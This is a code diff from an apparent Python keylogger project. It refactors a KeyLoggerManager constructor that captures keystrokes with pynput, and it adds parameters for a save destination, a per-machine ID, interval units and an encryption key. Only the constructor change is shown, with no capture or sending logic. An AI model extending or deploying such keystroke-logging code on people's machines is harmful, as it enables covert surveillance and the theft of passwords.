@@ -2,6 +2,7 @@ import time
 from threading import Thread, Event
 from pynput import keyboard
 
+from utils.conversions_utils import convert_to_seconds
 from listeners.listener import Listener
 from containers.container import Container
 
@@ -12,13 +13,17 @@ class KeyLoggerManager:
         keyboard.Key.space: 32,
     }
 
-    def __init__(self, save_interval, saving, encryption, key):
-        self.__container = Container(interval_value=1, unit='seconds')
+    def __init__(self, destination,saving, save_interval_value, 
+                 save_interval_unit, container_interval_value, 
+                 container_interval_unit, encryption, key_encryption,
+                 machine_id):
+        
+        self.__container = Container(container_interval_value, container_interval_unit)
         self.__listener = Listener(self.__container, self.stop)
-        self.__saving = saving()
-        self.__encryption = encryption(key)
+        self.__saving = saving(destination, machine_id)
+        self.__encryption = encryption(key_encryption)
 
-        self.__save_interval = save_interval
+        self.__save_interval = convert_to_seconds(save_interval_value, save_interval_unit)
         self.__interval_thread = Thread(target=self.__worker, daemon=False)
         self.__stop_event = Event()
 
